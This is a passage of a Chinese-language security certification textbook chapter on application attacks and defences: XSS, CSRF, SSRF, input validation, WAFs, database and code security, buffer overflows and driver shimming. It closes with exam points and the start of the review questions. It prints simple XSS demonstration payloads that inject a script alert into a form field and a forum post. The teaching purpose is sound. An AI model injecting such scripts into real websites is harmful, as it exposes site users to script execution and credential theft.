  \ HTTP 和 HTTPS 端口为攻击者提供了对服务器的访问，使其流量不太容易被安全工具检测到。此外，攻击者甚至可能会修复他们用于获取服务器访问权限的初始漏洞，以防止其被寻求控制服务器的其他攻击者或可能因此而察觉到成功攻击的安全团队发现。\n\
  \n##### 权限提升\n\n*权限提升*攻击旨在增加攻击者对目标系统的访问级别。它们利用允许将普通用户账户转换为更具特权账户（如 root 超级用户账户）的漏洞。\n\
  \n2016 年 10 月，安全研究人员宣布发现了一个被称为 Dirty COW 的 Linux 内核漏洞。该漏洞在 Linux 内核中存在了九年，极易被利用，并赋予成功的攻击者对受影响系统的管理控制权。\n\
  \n#### 利用 Web 应用程序漏洞\n\nWeb 应用程序是由应用程序代码、Web 平台、操作系统、数据库和相互连接的*应用程序编程接口 (API)* 组成的复杂生态系统。这些环境的复杂性使多种不同类型的攻击成为可能，并为渗透测试人员提供了肥沃的土壤。我们已经研究了针对\
  \ Web 应用程序的各种攻击，包括注入攻击、会话劫持、目录遍历等。在以下部分中，我们将通过探索跨站脚本、跨站请求伪造和点击劫持，来完善我们对基于 Web 的漏洞利用的了解。\n\
  \n##### 跨站脚本 (XSS)\n\n\n\n\n# 跨站脚本攻击（XSS）\n\n当 Web 应用程序允许攻击者执行 HTML 注入，将其自己的 HTML\
  \ 代码插入网页时，就会发生**跨站脚本（XSS）攻击**。\n\n###### 反射型 XSS\n\n当应用程序允许反射输入时，XSS 攻击通常会发生。例如，考虑一个简单的\
  \ Web 应用程序，它包含一个文本框，要求用户输入姓名。当用户点击提交时，Web 应用程序加载一个新页面，显示“Hello, name”。\n\n在正常情况下，此\
  \ Web 应用程序按设计运行。然而，恶意人员可能利用此 Web 应用程序欺骗毫无戒心的第三方。正如您所知，可以通过使用 HTML 标签 `<SCRIPT>`\
  \ 和 `</SCRIPT>` 在网页中嵌入脚本。假设您在“Name”字段中输入的不是“Mike”，而是以下文本：\n\n```\nMike<SCRIPT>alert('hello')</SCRIPT>\n\
  ```\n\n当 Web 应用程序以网页的形式“反射”此输入时，您的浏览器会像处理任何其他网页一样处理它：显示网页的文本部分并执行脚本部分。在本例中，脚本只是打开一个显示“hello”的弹出窗口。然而，您可以更恶意地包含一个更复杂的脚本，要求用户提供密码，然后将其传输给恶意第三方。\n\
  \n此时，您可能会问自己，怎么会有人成为这种攻击的受害者。毕竟，您不会通过在执行反射的 Web 应用程序的输入中嵌入脚本来攻击自己。此攻击的关键在于可以将表单输入嵌入链接中。恶意人员可以创建一个网页，其中包含标题为“Check\
  \ your account at First Bank”的链接，并在链接中编码表单输入。当用户访问该链接时，网页看起来像是一个真实的 First Bank 网站（因为它确实是！），工具栏中有正确的地址和有效的数字证书。然而，该网站随后会执行恶意用户在输入中包含的脚本，该脚本看起来是有效网页的一部分。\n\
  \n跨站脚本的解决办法是什么？在创建允许任何类型用户输入的 Web 应用程序时，开发人员必须确保执行输入验证。在最基本的层面上，应用程序绝不应允许用户在反射输入字段中包含\
  \ `<SCRIPT>` 标签。然而，这并不能完全解决问题；对于勤奋的 Web 应用程序攻击者来说，有许多巧妙的替代方案可用。最好的解决方案是确定应用程序将允许的输入类型，然后验证输入以确保其与该模式匹配。例如，如果应用程序有一个允许用户输入年龄的文本框，它应该只接受一到三位数字作为输入。应用程序应拒绝任何其他输入作为无效输入。\n\
  \n###### 存储型/持久型 XSS\n\n跨站脚本攻击通常利用反射输入，但这并不是攻击发生的唯一途径。另一种常见技术是将跨站脚本代码存储在远程 Web 服务器上，这种方法称为**存储型\
  \ XSS**。这些攻击被称为持久型，因为即使攻击者没有主动发动攻击，它们仍会保留在服务器上。\n\n作为一个例子，考虑一个允许用户发布包含 HTML 代码消息的留言板。这非常普遍，因为用户可能想使用\
  \ HTML 为其帖子添加强调效果。例如，用户可能在留言板帖子中使用以下 HTML 代码：\n\n```\n<p>Hello everyone,</p>\n<p>I\
  \ am planning an upcoming trip to <A HREF=\n'https://www.mlb.com/mets/ballpark'>Citi\
  \ Field</A> to see the Mets take on the\nYankees in the Subway Series.</p>\n<p>Does\
  \ anyone have suggestions for transportation? I am staying in Manhattan \nand am\
  \ only interested in <B>public transportation</B> options.</p>\n<p>Thanks!</p>\n\
  <p>Mike</p>\n```\n\n当在浏览器中显示时，HTML 标签会改变消息的外观，如图 6.16 所示。\n\n![图 6.16 在浏览器中渲染的留言板帖子](img/c06f016.png)\n\
  \n**图 6.16** 在浏览器中渲染的留言板帖子\n\n试图进行跨站脚本攻击的攻击者可能会尝试在此代码中插入 HTML 脚本。例如，他们可能会输入以下代码：\n\
  \n```\n<p>Hello everyone,</p>\n<p>I am planning an upcoming trip to <A HREF=\n'https://www.mlb.com/mets/ballpark'>Citi\
  \ Field</A> to see the Mets take on the \nYankees in the Subway Series.</p>\n<p>Does\
  \ anyone have suggestions for transportation? I am staying in Manhattan \nand am\
  \ only interested in <B>public transportation</B> options.</p>\n<p>Thanks!</p>\n\
  <p>Mike</p>\n<SCRIPT>alert('Cross-site scripting!')</SCRIPT>\n```\n\n当未来的用户加载此消息时，他们将看到图\
  \ 6.17 所示的警报弹窗。这相对无害，但 XSS 攻击也可用于将用户重定向到钓鱼网站、请求敏感信息或执行其他攻击。\n\n![图 6.17 在浏览器中渲染的\
  \ XSS 攻击](img/c06f017.png)\n\n**图 6.17** 在浏览器中渲染的 XSS 攻击\n\n##### 请求伪造\n\n请求伪造攻击利用信任关系，试图让用户在不知情的情况下针对远程服务器执行命令。它们有两种形式：跨站请求伪造和服务端请求伪造。\n\
  \n###### 跨站请求伪造（CSRF/XSRF）\n\n跨站请求伪造攻击，缩写为 XSRF 或 CSRF 攻击，与跨站脚本攻击相似，但利用的是不同的信任关系。XSS\
  \ 攻击利用用户对网站的信任在用户的计算机上执行代码。XSRF 攻击利用远程网站对用户系统的信任，代表用户执行命令。\n\nXSRF 攻击基于一个合理的假设：用户通常同时登录到许多不同的网站。攻击者随后在一个网站中嵌入代码，该代码向第二个网站发送命令。当用户点击第一个网站上的链接时，他们在不知情的情况下向第二个网站发送了命令。如果用户恰好登录了第二个网站，该命令可能会成功。\n\
  \n例如，考虑一个在线银行网站。想要从用户账户窃取资金的攻击者可能会访问一个在线论坛并发布一条包含链接的消息。该链接实际上直接指向资金转账网站，发出一条将资金转入攻击者账户的命令。攻击者随后将链接留在论坛上，等待毫无戒心的用户前来点击该链接。如果用户恰好登录了银行网站，转账就会成功。\n\
  \n开发人员应保护其 Web 应用程序免受 XSRF 攻击。一种方法是创建使用安全令牌的 Web 应用程序，攻击者无法知道该令牌以将其嵌入链接中。另一种保护措施是网站检查从最终用户接收到的请求中的引用\
  \ URL，并且只接受源自其自身网站的请求。\n\n###### 服务端请求伪造（SSRF）\n\n服务端请求伪造（SSRF）攻击利用类似的漏洞，但它们不是诱骗用户的浏览器访问\
  \ URL，而是根据用户提供的输入诱骗服务器访问 URL。当 Web 应用程序接受来自用户的 URL 作为输入，然后从该 URL 检索信息时，SSRF 攻击就成为可能。如果服务器有权访问非公开\
  \ URL，SSRF 攻击可能会无意中将该信息泄露给攻击者。\n\n#### 应用程序安全控制\n\n\n\n\n尽管影响应用程序的众多漏洞是网络安全专业人员极为关注的重大问题，但好消息是，有许多工具可用于协助开发纵深防御安全方法。通过安全编码实践和安全基础设施工具的结合，网络安全专业人员可以构建强大的防御体系来抵御应用程序攻击。\n\
  \n##### 输入验证\n\n网络安全专业人员和应用程序开发人员手头有多种工具，可帮助防范应用程序漏洞。其中最重要的是 `input validation`（输入验证）。允许用户输入的应用程序应对该输入执行验证，以降低其包含攻击代码的可能性。不当的输入处理实践会使应用程序面临注入攻击、跨站脚本攻击和其他攻击。\n\
  \n最有效的输入验证形式是 `input whitelisting`（输入白名单），即开发人员描述预期从用户处接收的确切输入类型，然后在将输入传递给其他进程或服务器之前，验证该输入是否符合该规范。例如，如果输入表单提示用户输入年龄，输入白名单可以验证用户提供的值是否为\
  \ 0–120 范围内的整数。应用程序随后会拒绝该范围之外的任何值。\n\n由于许多允许用户输入的字段的性质，执行输入白名单验证通常很困难。例如，设想一个分类广告应用程序，允许用户输入待售产品的描述。要编写描述该字段所有有效提交且同时防止恶意代码插入的逻辑规则是很困难的。在这种情况下，开发人员可能会使用\
  \ `input blacklisting`（输入黑名单）来控制用户输入。采用这种方法时，开发人员不尝试显式描述可接受的输入，而是描述必须阻止的潜在恶意输入。例如，开发人员可能会限制用户输入中\
  \ HTML 标签或 SQL 命令的使用。执行输入验证时，开发人员必须注意字段中可能出现的合法输入类型。例如，完全禁止使用单引号（`'`）可能有助于防范 SQL\
  \ 注入攻击，但也可能导致包含撇号的姓氏（如 O’Brien）难以输入。\n\n##### Web 应用程序防火墙\n\n`Web application firewalls\
  \ (WAFs)`（Web 应用程序防火墙）在保护 Web 应用程序免受攻击方面也发挥着重要作用。虽然开发人员应始终依靠输入验证作为抵御注入攻击的主要防线，但现实是应用程序有时仍会包含注入缺陷。这可能发生在开发人员测试不足，或供应商未及时为易受攻击的应用程序提供补丁时。\n\
  \nWAF 的功能类似于网络防火墙，但它们工作在应用层。WAF 位于 Web 服务器前方，如 图 6.18 所示，并接收所有发往该服务器的网络流量。然后，它会仔细检查发往应用程序的输入，在将输入传递给\
  \ Web 服务器之前执行输入验证（白名单和/或黑名单）。这可以防止恶意流量到达 Web 服务器，并作为针对 Web 应用程序漏洞的分层防御的重要组成部分。\n\
  \n##### 数据库安全\n\n安全的应用程序依赖于安全的数据库，以提供支持业务运营所需的内容和事务处理。关系型数据库构成了大多数现代应用程序的核心，保护这些数据库不仅仅是防范\
  \ SQL 注入攻击。网络安全专业人员应深入了解安全的数据库管理实践。\n\n![图 6.18 Web 应用程序防火墙](img/c06f018.png)\n\n\
  **图 6.18** Web 应用程序防火墙\n\n###### 规范化\n\n`Database normalization`（数据库规范化）是数据库设计人员在构建和修改数据库时应遵循的一组设计原则。遵循这些原则的数据库被称为符合范式，范式按遵循原则的程度递增编号。最简单的范式是第一范式（1NF），更高级的范式依次递增（2NF、3NF\
  \ 等）。\n\n数据库社区就数据库设计人员应多严格地遵循范式进行着积极而健康的讨论。在切实可行的范围内尽可能实施这些原则的一些优势包括：规范化设计可做到以下几点：\n\
  \n*   防止数据不一致\n*   防止更新异常\n*   减少重构现有数据库的需求，以及\n*   使数据库模式更具信息量\n\n###### 参数化查询\n\
  \n参数化查询提供了另一种保护应用程序免受注入攻击的技术。在参数化查询中，客户端不会直接将 SQL 代码发送给数据库服务器。相反，客户端将参数发送给服务器，服务器再将这些参数插入预编译的查询模板中。这种方法可防范注入攻击，还能提高数据库性能。\n\
  \n`Stored procedures`（存储过程）是某些数据库平台使用的参数化查询的一种实现示例。\n\n###### 混淆与伪装\n\n在数据库中维护敏感个人信息会使组织面临风险，一旦该信息被攻击者窃取。数据库管理员应采取措施防范\
  \ `data exposure`（数据泄露）。\n\n*   `Data minimization`（数据最小化）是最佳防御。组织不应收集不需要的敏感信息，并应在收集的敏感信息不再用于合法业务目的时尽快销毁。数据最小化可降低风险，因为你无法失去对你原本就没有掌握的信息的控制！\n\
  *   `Tokenization`（令牌化）使用查找表用唯一标识符替换可能直接揭示个人身份的个人标识符。例如，我们可以用一个随机生成的 10 位数字替换广为人知的值（如学生\
  \ ID）。然后我们维护一个查找表，以便在需要确定某人身份时将这些数字转换回学生 ID。当然，如果使用这种方法，你需要保护好查找表的安全！\n*   `Hashing`（哈希）使用加密哈希函数将敏感标识符替换为不可逆的替代标识符。在哈希之前用随机数对这些值进行\
  \ `Salting`（加盐），可使这些哈希值能抵抗一种称为彩虹表攻击的攻击类型。你将在 第 7 章“密码学和公钥基础设施”中了解更多关于哈希、加盐和彩虹表攻击的内容。\n\
  \n##### 代码安全\n\n软件开发人员还应采取措施，保护其代码的创建、存储和交付。他们通过多种技术来实现这一点。\n\n###### 代码签名\n\n`Code\
  \ signing`（代码签名）为开发人员提供了一种向最终用户确认其代码真实性的方法。开发人员使用加密函数以其私钥对代码进行数字签名，然后浏览器可以使用开发人员的公钥来验证该签名，确保代码合法且未被未经授权的人员篡改。在缺乏代码签名的情况下，用户可能会无意中运行非真实代码。\n\
  \n###### 代码复用\n\n许多组织不仅在内部复用代码，还通过使用第三方软件库和软件开发工具包（SDK）来复用代码。第三方软件库是开发人员之间共享代码的常用方式。\n\
  \n\n\n\n\n####### 库和 SDK\n\n库由执行相关功能的共享代码对象组成。例如，软件库可能包含一系列与生物学研究、金融分析或社交媒体相关的函数。开发人员无需编写代码来执行他们所需的每一个详细功能，只需找到包含相关函数的库，然后调用这些函数即可。\n\
  \n试图让库更易于开发人员使用的组织通常会发布软件开发工具包（SDK）。SDK 是软件库的集合，结合了文档、示例和其他资源，旨在帮助程序员在开发环境中快速上手。SDK\
  \ 通常还包括专用工具，旨在帮助开发人员设计和测试代码。\n\n当组织将代码开发外包给其他组织时，也可能将第三方代码引入其环境。安全团队应确保外包代码接受与内部开发代码同等级别的测试。\n\
  \n安全专业人员应熟悉其组织中使用第三方代码的各种方式，以及其组织向他人提供服务的方式。共享代码中出现安全缺陷的情况相当普遍，因此了解这些依赖关系并对安全更新保持警惕极为重要。\n\
  \n###### 软件多样性\n\n安全专业人员致力于避免其环境中的单点故障，以防止单个组件出现问题时引发可用性风险。这对软件开发同样适用。安全专业人员应留意组织中依赖单一源代码、二进制可执行文件或编译器的地方。虽然可能无法消除所有这些依赖，但跟踪它们是维护安全代码库的关键部分。\n\
  \n###### 代码仓库\n\n`代码仓库` 是用于存储和管理应用程序源代码的中心位置。代码仓库的主要目的是将软件开发中使用的源文件存储在一个中心位置，该位置允许安全存储并协调多个开发人员之间的变更。\n\
  \n代码仓库还执行 `版本控制`，允许跟踪变更并在需要时将代码回滚到早期版本。基本上，代码仓库执行软件开发的内务工作，使许多人能够以有组织的方式共同完成大型软件项目。它们还满足了安全和审计专业人员的需求，他们希望确保软件开发包含变更的自动审计和日志记录。\n\
  \n通过向组织中的所有开发人员公开代码，代码仓库促进了代码重用。寻求执行特定功能代码的开发人员可以在仓库中搜索现有代码并重用它，而不必从零开始。\n\n代码仓库还有助于避免\
  \ `僵尸代码` 问题，即代码在组织中正在使用，但没有人负责维护该代码，事实上，甚至没人知道原始源文件驻留在何处。\n\n###### 完整性度量\n\n代码仓库是应用程序安全的重要组成部分，但只是代码管理的一个方面。网络安全团队还应与开发人员和运维团队通力合作，确保应用程序通过组织批准的发布管理流程以安全的方式进行预配和取消预配。\n\
  \n此过程应包括代码完整性度量。代码完整性度量使用加密哈希函数来验证发布到生产环境的代码与之前批准的代码是否匹配。哈希值的任何偏差都表明代码被修改过，无论是有意还是无意，都需要在发布前进行进一步调查。\n\
  \n###### 应用弹性\n\n在设计应用程序时，我们应使其能够在不断变化的需求面前保持弹性。我们通过应用两个相关原则来实现这一点：\n\n*   `可扩展性`\
  \ 意味着应用程序的设计应使其所需的计算资源可逐步增加，以支持不断增长的需求。\n*   `弹性` 进一步超越了可扩展性，它意味着应用程序应能在必要时自动预配资源以进行扩展，然后在不再需要时自动取消预配这些资源，以减少容量（和成本）。\n\
  \n#### 安全编码实践\n\n创建应用程序可能涉及多种开发风格、语言、框架和其他变量，但无论使用哪种，许多安全问题都是相同的。事实上，尽管许多开发框架和语言提供了安全功能，但相同的安全问题仍不断出现在应用程序中！幸运的是，许多通用的最佳实践可供你使用，以帮助确保组织的软件安全。\n\
  \n### 源代码注释\n\n注释是优秀开发人员工作流程的重要组成部分。注释被战略性地放置在代码中，它们记录设计选择、解释工作流程，并提供对稍后可能被要求修改或排查代码的其他开发人员至关重要的细节。掌握在正确的人手中时，注释至关重要。\n\
  \n然而，注释也可能为攻击者提供解释代码如何工作的路线图。在某些情况下，注释甚至可能包含应保密的关键安全细节。开发人员应采取措施确保其代码的注释版本保密。对于编译型代码，这没有必要，因为编译器会自动从可执行文件中移除注释。然而，暴露其代码的\
  \ Web 应用程序可能允许远程用户查看代码中留下的注释。在这些环境中，开发人员应在部署前从生产版本的代码中移除注释。在归档的源代码中保留注释作为未来开发人员的参考是可以的——只是不要让它们在互联网上被未知人员访问！\n\
  \n##### 错误处理\n\n攻击者善于利用代码中的错误。开发人员必须理解这一点，并编写代码使其能抵御攻击者为测试代码边界而可能创建的意外情况。例如，如果 Web\
  \ 表单请求年龄作为输入，仅验证年龄是否为整数是不够的。攻击者可能在该字段中输入一个 50,000 位的整数，试图执行整数溢出攻击。开发人员必须预判意外情况，并编写\
  \ `错误处理` 代码以安全的方式介入并处理这些情况。不当的错误处理可能使代码面临不可接受的风险水平。\n\n从错误处理的另一面来看，过于冗长的错误处理例程也可能带来风险。如果错误处理例程解释了过多关于代码内部工作原理的信息，它们可能允许攻击者找到利用代码的方法。例如，图\
  \ 6.19 显示了一个出现在法国网站上的错误消息，其中包含用于创建网页的 SQL 查询的详细信息。你不需要懂法语就能理解这可能允许攻击者确定表结构并尝试 SQL\
  \ 注入攻击！\n\n![图 6.19 SQL 错误泄露](img/c06f019.png)\n\n**图 6.19** SQL 错误泄露\n\n##### 硬编码凭据\n\
  \n\n\n\n##### 硬编码凭据\n\n在某些情况下，开发人员可能会在源代码中包含用户名和密码。此错误有两种变体。首先，开发人员可能会为应用程序创建一个硬编码的维护账户，即使身份验证系统发生故障，也允许开发人员重新获得访问权限。这被称为\
  \ `backdoor`（后门）漏洞，之所以成问题，是因为它允许任何知道后门密码的人绕过正常身份验证并访问系统。如果后门被公开（或私下！）知晓，生产环境中的所有代码副本都将受到威胁。\n\
  \n硬编码凭据的第二种变体发生在开发人员在其源代码中包含其他服务的访问凭据时。如果该代码被有意或意外泄露，这些凭据就会为外部人员所知。当开发人员意外将包含 API\
  \ 密钥或其他硬编码凭据的代码发布到公共代码仓库（如 `GitHub`）时，这种情况经常发生。\n\n##### 内存管理\n\n应用程序通常负责管理其自身的内存使用，在这种情况下，不良的内存管理实践会破坏整个系统的安全性。\n\
  \n###### 资源耗尽\n\n我们需要关注的关于内存或系统上任何其他有限资源的问题之一是 `resource exhaustion`（资源耗尽）。无论是有意还是无意，系统可能会消耗掉其可用的所有内存、存储、处理时间或其他资源，导致系统瘫痪或无法用于其他用途。\n\
  \n`Memory leaks`（内存泄漏）是资源耗尽的一个例子。如果应用程序向操作系统请求内存，最终将不再需要该内存，并应将内存返还给操作系统供其他用途使用。在存在内存泄漏的应用程序中，应用程序未能返还其不再需要的部分内存，可能只是丢失了对已写入内存保留区域的对象的跟踪。如果应用程序长期持续这样做，会慢慢耗尽系统可用的所有内存，导致系统崩溃。重启系统通常能重置问题，将内存返还给其他用途，但如果内存泄漏未得到修正，循环将重新开始。\n\
  \n###### 指针解引用\n\n`Memory pointers`（内存指针）也可能导致安全问题。指针是应用程序开发中常用的概念。它们只是存储内存中另一位置地址的内存区域。\n\
  \n例如，我们可能有一个名为 `photo` 的指针，它包含存储照片的内存位置的地址。当应用程序需要访问实际照片时，它会执行一个称为 `pointer de-referencing`（指针解引用）的操作。这仅意味着应用程序遵循指针并访问指针地址引用的内存。此过程并无异常。应用程序一直在这样做。\n\
  \n可能出现的一个特定问题是指针为空，包含程序员所谓的 `null`（空）值。如果应用程序尝试解引用此 `null` 指针，会导致称为 `null pointer\
  \ exception`（空指针异常）的情况。在最好的情况下，`null pointer exception` 会导致程序崩溃，向攻击者提供可用于侦察应用程序安全性的调试信息。在最坏的情况下，`null\
  \ pointer exception` 可能允许攻击者绕过安全控制。安全专业人员应与应用程序开发人员合作，帮助他们避免这些问题。\n\n###### 缓冲区溢出\n\
  \n当攻击者操纵程序将比为该程序分配的内存区域更多的数据放入其中时，会发生 `Buffer overflow`（缓冲区溢出）攻击。其目标是用可能由系统上运行的其他进程执行的指令覆盖内存中的其他信息。\n\
  \n缓冲区溢出攻击非常普遍，且往往在首次发现后持续多年。例如，2016 年 Verizon 数据泄露调查报告确定了 10 个漏洞，它们导致了研究中 85% 的妥协事件。前\
  \ 10 名中有四个是溢出问题：\n\n*   `CVE 1999-1058`：Vermillion FTP Daemon 中的缓冲区溢出\n*   `CVE\
  \ 2001-0876`：Windows 98、98SE、ME 和 XP 上通用即插即用 (UPnP) 中的缓冲区溢出\n*   `CVE 2002-0126`：BlackMoon\
  \ FTP Server 1.0 至 1.5 中的缓冲区溢出\n*   `CVE 2003-0818`：Microsoft ASN.1 库中的多个整数溢出\n\n\
  每个漏洞标题中字母 `CVE` 后面的四位数字表示发现该漏洞的年份。在一项发生于 2015 年的泄露事件研究中，导致泄露的前 10 个问题中有四个是利用了已有\
  \ 12 到 16 年历史的溢出漏洞！Verizon 在最近的报告中未包含此类分析，但没有理由认为这一趋势已改变。\n\n在漏洞扫描期间发现 `buffer overflow`（缓冲区溢出）漏洞的网络安全分析师应寻找修复该问题的补丁。在大多数情况下，扫描报告将直接指出可用的补丁。\n\
  \n##### 竞争条件\n\n当代码段的安全性取决于系统内事件发生的顺序时，会发生 `Race conditions`（竞争条件）。`time-of-check-to-time-of-use\
  \ (TOCTTOU or TOC/TOU)`（检查时间到使用时间）问题是一种竞争条件，它发生在程序过早检查访问权限（远在资源请求之前）时。例如，如果操作系统在用户登录时构建一份详尽的访问权限列表，然后在整个登录会话期间查阅该列表，则存在\
  \ `TOCTTOU` 漏洞。如果系统管理员撤销了特定权限，该限制直到用户下次登录时才会应用。如果用户在访问权限撤销时已登录，他们将无限期地拥有对该资源的访问权限。用户只需保持会话打开数天，新限制就永远不会被应用。为防止此竞争条件，开发人员应在每次请求时评估访问权限，而不是缓存权限列表。\n\
  \n##### 无保护的 API\n\n组织通常希望其他开发人员在其创建的平台基础上进行构建。例如，`Twitter` 和 `Facebook` 可能希望允许第三方应用程序开发人员创建向用户社交媒体动态发布内容的应用。为了实现这种创新，服务通常会创建\
  \ `application programming interfaces (APIs)`（应用程序编程接口），以实现自动化访问。\n\n如果未妥善保护，无保护的\
  \ API 可能导致功能被未经授权地使用。例如，未使用适当身份验证的 API 可能允许任何知道 API URL 的人修改服务。非供公共使用的 API 应始终使用身份验证机制（如\
  \ `API key`（API 密钥））进行保护，并且仅通过加密通道访问，以保护这些凭据免受窃听攻击。\n\n##### 驱动程序操纵\n\n`Device drivers`（设备驱动程序）在计算中发挥着重要作用。它们充当硬件设备与操作系统之间的软件接口。设备驱动程序是您可以将几乎任何制造商的打印机与\
  \ `Windows` 或任何其他操作系统配合使用的原因。`Microsoft` 无需设计 `Windows` 以适配市场上每一款单独的打印机。相反，他们为打印机制造商提供为其打印机编写\
  \ `Windows` 驱动程序的能力。当制造商制造新打印机时，他们还会设计一个驱动程序，为 `Windows` 提供如何与打印机交互的指令。\n\n\n\n\n\
  设备驱动程序需要对操作系统进行低级访问，并以管理员权限运行。如果攻击者能说服用户在其计算机上安装恶意驱动程序，该恶意软件就能完全控制系统。\n\n攻击者实现这一点的一种方法是*重构*现有驱动程序。如果他们能访问驱动程序的源代码，就可以对其进行修改，使其也包含恶意软件元素。然而，在实践中这非常难以实现，因为获取驱动程序的源代码并不容易。\n\
  \n无法访问驱动程序源代码的攻击者可以使用一种称为*垫片*的技术。这会获取一个合法驱动程序，并在其外部包裹一个恶意驱动程序。恶意驱动程序（称为垫片）接收来自操作系统的请求，并将其直接传递给合法驱动程序，以便设备正常运行。然而，该驱动程序也可以在后台执行其恶意软件载荷。\n\
  \n幸运的是，现代操作系统都包含针对恶意驱动程序的保护措施。其中最重要的保护是代码签名。设备制造商编写驱动程序，然后对其应用数字签名，以便操作系统能够验证其真实性。如果驱动程序未经过数字签名，操作系统可能会警告用户存在可疑驱动程序，或直接阻止其安装。\n\
  \n驱动程序的特权性质使其能深度访问操作系统。安全专业人员必须确保其组织中使用的驱动程序是合法的，且未被修改用于执行恶意活动。\n\n### 摘要\n\n软件在每个组织中都发挥着不可或缺的作用，执行的任务范围从财务交易到敏感物理基础设施组件的管理。网络安全专业人员必须确保其环境中使用的软件经过严格测试，以确保其满足业务需求，且不会使组织面临严重的网络安全风险。\n\
  \n实现这一目标需要深入了解源代码以及客户端-服务器和 Web 应用程序部署中可能出现的不同类型的漏洞。在本章中，您了解了许多此类漏洞以及用于管理软件安全风险的工具。\n\
  \n### 考试要点\n\n**了解如何分析与应用程序攻击相关的指标。** 软件应用程序可能遭受各种漏洞的影响，使其容易受到攻击。您应该熟悉这些攻击，包括权限提升、跨站脚本、注入攻击、请求伪造攻击，以及攻击者利用应用程序代码的许多其他方式。了解这些攻击背后的方法有助于安全专业人员建立充分的防御并识别针对其组织的攻击。\n\
  \n**理解安全软件开发概念。** 软件应使用标准化的软件开发生命周期来创建，该周期将软件移动通过开发、测试、暂存和生产环境。开发人员应了解与代码重用和软件多样性相关的问题。Web\
  \ 应用程序的开发应符合行业标准原则，例如开放 Web 应用程序安全项目 (OWASP) 制定的原则。\n\n**解释安全代码部署和自动化概念。** 代码仓库充当版本控制机制，以及代码安全预配和取消预配的集中授权机构。开发人员和运维团队应共同制定自动化行动方案，因为他们在实施创建和部署软件的\
  \ DevOps 方法。软件应用程序的设计应支持可扩展性和弹性。\n\n**了解如何实施数据库安全控制。** 数据库通常存储组织最敏感的信息，应采取数据库安全控制来充分保护该信息。这始于使用规范化的数据库设计，并继续使用存储过程与数据库交互。存储在数据库中的敏感信息应通过数据最小化、数据标记化，以及加盐和哈希的组合来保护。\n\
  \n**了解如何实施应用程序安全控制。** 应用程序安全应成为安全运营原则的重中之重。这包括通过输入验证保护代码。依赖 Cookie 进行会话管理的 Web 应用程序应通过传输加密来保护这些\
  \ Cookie。代码应定期接受代码审查以及静态和动态测试。\n\n### 复习题\n\n1.  Adam 通过审查应用程序的源代码来进行软件测试。Adam 正在进行哪种类型的代码测试？\n\
